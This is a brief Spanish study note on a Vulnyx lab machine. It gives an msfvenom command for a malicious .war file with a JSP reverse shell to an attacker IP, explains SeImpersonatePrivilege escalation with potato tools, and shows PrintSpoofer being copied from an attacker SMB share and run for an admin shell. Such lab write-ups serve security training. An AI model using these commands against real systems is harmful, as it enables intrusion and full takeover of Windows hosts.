- Tags #window #escalada #escalada_privilegios #escalada_privilegios_windows #recursos #recursos_vulnyx #msfvenom #metasploit #SeImpersonatePrivilege #tool_rottenpotato

**Recurso**: Maquina War Vulnyx

Creamos un archivo .war malicioso con msfvenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.22.11 LPORT=444 -f war -o pwned.war
```


*SeImpersonatePrivilege*: Nos permite escalar privilegios en maquinas windows, este lo que permite es obtener un token de seguridad  de otros usuarios distintos.

Se puede lograr esta escalada con un usuario que tenga este permiso y con herramientas com *rottenpotato*, *PrintSpoofer*,  *# juicy-potato*

 *rottenpotato* : [https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
 **Recomendado PrintSpoofer** :[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 *juicy-potato* :[https://github.com/topics/juicy-potato](https://github.com/topics/juicy-potato)

![](../../../../attachments/Pasted%20image%2020260215151430.png)

PrintSpoofer Nos descargamos el .exe desde su repo y lo compartimos desde nuestro kali para llevrlo a la maquina victima

```bash
impacket-smbserver nombre_recurso_compartido $(pwd) -smb2support

impacket-smbserver share $(pwd) -smb2support

#Desde la maquina windows
>copy \\ip_attacker\nombre_recurso_compartido\file_objetivo.exe nombre_con_el_que_lo_guardamos.exe

>copy \\ip_attacker\share\PrintSpoofer.exe PrintSpoofer.exe

#Ejecutamos el programa
>PrintSpoofer.exe -i -c cmd

#Nos otorga una cmd como administrador

```